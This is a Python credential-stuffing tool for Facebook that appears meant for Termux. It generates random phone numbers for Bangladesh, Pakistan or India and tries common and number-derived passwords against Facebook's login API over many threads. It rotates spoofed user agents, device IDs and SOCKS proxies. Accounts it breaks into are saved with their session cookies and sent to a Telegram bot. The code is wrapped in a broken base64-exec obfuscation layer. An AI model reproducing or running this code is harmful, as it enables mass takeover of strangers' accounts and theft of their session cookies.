import base64

code = '''import requests

def check_access():
    url = "https://raw.githubusercontent.com/Woode-Ahmed/NO_BRAK/refs/heads/main/XXFG"
    try:
        r = requests.get(url, timeout=5)
        if "woode" in r.text:
            return True
    except:
        pass
    return False

if check_access():
    print("✅ R U N N N N")
    
else:
    print("❌ O F T I M E")
    exit()



import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ========== [ USER AGENT LIST ADDITION ] ==========
user_agents = [
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
    "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
]
# ========== [ END OF USER AGENT LIST ADDITION ] ==========

gtxx = ("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt = gtxx

try: os.system("pkg install espeak")
except: pass
os.system("git pull")
try:
    proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('socksku.txt', 'w').write(proxylist)
except Exception as e: pass
proxsi = open('socksku.txt', 'r').read().splitlines()

B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'

ugen = []
ugtn = []
ugxn = []
xxxxx = gtxx
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
dt = "•"
id
ok = []
cp = []
twf = []
lop = 0
xode = []
plist = []
cpx = []
cokix = []
apkx = []
paswtrh = []
rcd = []
rcdx = []
version = "1.07"

def telegram_setup():
    print(f"{G}[?]{W}TRY AND TRY YOU CAN DO IT{E}")
    tg_id = input("ENTER ID: ")
    print(f"{G}[?]{W} SUDAN YA MAN{E}")
    tg_token = input("Token: ")
    return tg_id, tg_token

TG_ID, TG_TOKEN = telegram_setup()

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    data = {"chat_id": TG_ID, "text": msg}
    try:
        requests.post(url, data=data)
    except:
        pass

def line():
    print(40 * "=")

def logo():
    os.system('clear');print(f"""\r\r\x1b[1;97m{W}
╭╮╭╮╭┳━━━┳━━━┳━━━┳━━━╮
┃┃┃┃┃┃╭━╮┃╭━╮┣╮╭╮┃╭━━╯
┃┃┃┃┃┃┃╱┃┃┃╱┃┃┃┃┃┃╰━━╮
┃╰╯╰╯┃┃╱┃┃┃╱┃┃┃┃┃┃╭━━╯
╰╮╭╮╭┫╰━╯┃╰━╯┣╯╰╯┃╰━━╮
╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━╯
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : Ahmed woode
 [{G}+{W}] GIFT BY  : woode
 [{G}+{W}] FACEBOOK : a.woode.249
 [{G}+{W}] TELEGRA  : NO-BRAK                      
 [{G}+{W}] VERSION  : {G}{version}{W}
{40*"="}\x1b[1;97m""")

def Main():
    logo()
    print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}SD-w{W}]')
    print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}SD_G{W}]')
    print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}SD_M{W}]')
    line()
    ghx = input(f' [{G}+{W}] Choice : {G}')
    if ghx in ["A", "a", "1"]:
        rcd.append(f'1')
        rmenu1()
    elif ghx in ["B", "b", "2"]:
        rcd.append(f'2')
        rmenu1()
    elif ghx in ["C", "c", "3"]:
        rcd.append(f'3')
        rmenu1()
    else:
        line()
        print(f'\n \t {R}Choose valid option{E}')
        time.sleep(1)
        Main()

def rmenu1():
    logo()
    if "1" in rcd:
        print(f"{W}BD SIM CODE : {G}09 01{E}{W}")
        line()
    if "2" in rcd:
        print(f"{W}PAK SIM CODE : {G}0990 0912 0110 0991 0921{E}{W}")
        line()
    if "3" in rcd:
        print(f"{W}IND SIM CODE : {G}090 099 091 010 011{E}{W}")
        line()
    code = input(f'{W}[{G}+{E}] Choice : {G}')
    print(f"{W}{40*'='}")
    print(f'EXAMPLE : {G}10000{W},{G}50000{W},{G}100000{W},{G}150000{W},{G}200000{W}')
    line()
    limit = int(input(f'[{G}+{E}] Limit : {G}'))
    print(f"{W}{40*'='}")
    print(f'[{"+"}] Do you went show cp account (y/n)')
    line()
    cx = input(f'[{W}[{G}+{E}] Choice : {G}')
    if cx in ['n', 'N', 'no', 'NO', '2']:
        cpx.append(f'n')
    else:
        cpx.append(f'y')
    print(f"{W}{40*'='}")
    print(f'[{"+"}] Do you went show cookie (y/n)')
    line()
    ckiv = input(f'{W}[{G}+{E}] Choice : {G}')
    if ckiv in ['n', 'N', 'no', 'NO', '2']:
        cokix.append(f'n')
    else:
        cokix.append(f'y')
    for number in range(limit):
        if "1" in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(8))
            xode.append(numberx)
        if "2" in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(7))
            xode.append(numberx)
        if "3" in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(6))
            xode.append(numberx)
    with ThreadPool(max_workers=60) as tonxoys:
        tid = str(len(xode))
        logo()
        print(f' [{G}•{W}] TOTAL ID :\033[1;92m ' + tid)
        print(f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m' + code)
        print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS HAS BEEN STARTED')
        print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ')
        print(40 * "=")
        for rngx in xode:
            id = code + rngx
            if "1" in rcd:
                psd = [id, rngx, id[:6], id[:7], id[:8], id[5:] ,"سلام عليكم" ,"123456" ,"1234567" ,"12345678" ,"123456789" ,"123123" ,"111111","السودان","00000000","انا سوداني","بسم الله الرحمن الرحيم","كلمة السر","sudani", "112233", "123456789",
    "1234567", "1234567890", "password", "000000",
    "123123", "qwerty", "111111", "abc123",
    "1q2w3e4r", "sun123", "iloveyou", "12345"]
            if "2" in rcd:
                psd = [id, rngx, id[5:], "khan123"]
            if "3" in rcd:
                psd = [id, rngx, id[:6], "57273200"]
            tonxoys.submit(graphrm, id, psd, tid)
            time.sleep(5)  # نصف ثانية بين كل محاولة رقم

lk = []
def graphrm(id, psd, tid):
    global ok, cp, lk, lop
    togg = []
    sys.stdout.write(f'\r\r{BG}[{W}WOODE{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}' % (len(ok), len(lk)))
    sys.stdout.flush()
    for psw in psd:
        if random.randint(0, 1):
            vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
            VAPP = random.randint(410000000,499999999)
            gtt = random.choice(xxxxx)
            gttt = random.choice(xxxxx)
            ua = (
    f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} '
    f'Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '
    '[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};'
    'FBLC/en_GB;FBRV/859351995;FBCR/AT-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;'
    'FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
)
        else:
            ua = random.choice(user_agents)
        datax = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': id,
            'password': psw,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'
        }
        header = {
            'User-Agent': ua,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
        }
        twfx = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
        lo = requests.post('https://' + 'b-gr' + 'ap' + 'h' + '.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
        if 'session_key' in lo:
            cki = lo["session_cookies"]
            ck = {}
            for xk in cki: ck.update({xk["name"]: xk["value"]})
            coki = (";").join(["%s=%s" % (key, value) for key, value in ck.items()])
            iid = re.findall('c_user=(.*);xs', coki)[0]
            print(f'\r\r{G}[woode-OK] {iid} | {psw}{W}')
            os.system('espeak -a 300 "ok id"')
            ok.append(id)
            open('/sdcard/ROOTSAJIB-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + "\n")
            send_telegram(f"[woode-OK] {iid} | {psw}\n{coki}")
            if 'y' in cokix:
                print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}')
                print(f"{W}{40*'-'}{E}")
            break
        elif twfx in str(lo):
            iid = lo['error']['error_data']['uid']
            print(f'\r\r{BL}[WOODE-2F] {iid} | {psw}{W}')
            os.system('espeak -a 300 "two,f id"')
            open('/sdcard/ROOTSAJIB-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + "\n")
            send_telegram(f"[WOODE-2F] {iid} | {psw}")
            twf.append(id)
            break
        elif 'www.facebook.com' in lo['error']['message']:
            try:
                iid = lo['error']['error_data']['uid']
            except:
                iid = id
            if iid in ok:
                pass
            else:
                if 'y' in cpx:
                    print(f'\r\r{R}[WOODE-GOOD] {iid} | {psw}{W}')
                    cp.append(id)
                    os.system('espeak -a 300 "cp id"')
                    open('/sdcard/TKM-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + "\n")
                    send_telegram(f"[WOODE-GOOD] {iid} | {psw}")
            break
        else:
            continue
    lop += 1

Main()'''  

exec(base64.b64decode(code).decode())
